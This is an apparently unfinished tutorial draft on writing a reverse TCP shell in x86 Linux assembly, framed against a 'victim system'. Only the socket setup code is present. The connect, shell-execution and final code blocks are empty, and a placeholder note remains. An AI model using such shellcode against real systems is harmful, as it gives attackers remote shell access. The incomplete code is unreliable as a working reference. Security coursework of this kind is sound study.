
# Creating a reverse TCP shell in x86 Assembly

**What is a reverse TCP shell?**

A reverse TCP shell is a program that instead of listening for incoming connections, the program will connect to a remote system and provide a local shell. This is useful in situations where the victim system is behind NAT, meaning you can't directly connect to it, instead the server will connect to you. For this reason, reverse TCP shells are usually prefered over bind shells.

## Okey let's do this, leeeerooooyyy jeeeeeenkins

Our previous article followed these steps to create a bind shell:
1. Create a socket
2. Bind the socket
3. Listen for connections
4. Accept new connections
5. Execute shell

This program will only need the following steps:
1. Create a socket
2. Connect to remote system
3. Execute shell

As can be seen, the reverse shell requires less steps and less code in order to function. For this assignment, I did not create a reference program in C, because most of the code was borrowed from our previous bind shell article. The only new code section in this assignment is the connect() function.

```
global _start

section .text

_start:

    ; zero out registers
    xor eax, eax
    xor ebx, ebx
    xor edx, edx

    ; -------------------------------------
    ; # Setup socket

    ; socketcall()
    mov al, 0x66     ; __NR_socketcall 102
    mov bl, 0x1      ; SYS_SOCKET

    ; # Setup socket
    ; Resulting file descriptor is saved to eax
    push edx
    push 0x1
    push 0x2
    mov ecx, esp     ; Arguments are located top of the stack
    int 0x80         ; Tell the kernel it's time to boogie
    mov edi, eax     ; $eax contains the file descriptor created by socket(), store it in $edi for now
```

After setting up the socketcall wrapper to call connect(), we need to setup the necessary arguments for `connect()`:

```

```

write something about the address, how to avoid nulls

Now we use `dup2()` to set STDIN, STDOUT, STDERR to our file descriptor, and execute `/bin/sh`. This will expose a local shell to the connected socket, thereby acheiving a remote TCP shell.

```

```

**Final code:**


```

```

## Making the address and port configurable



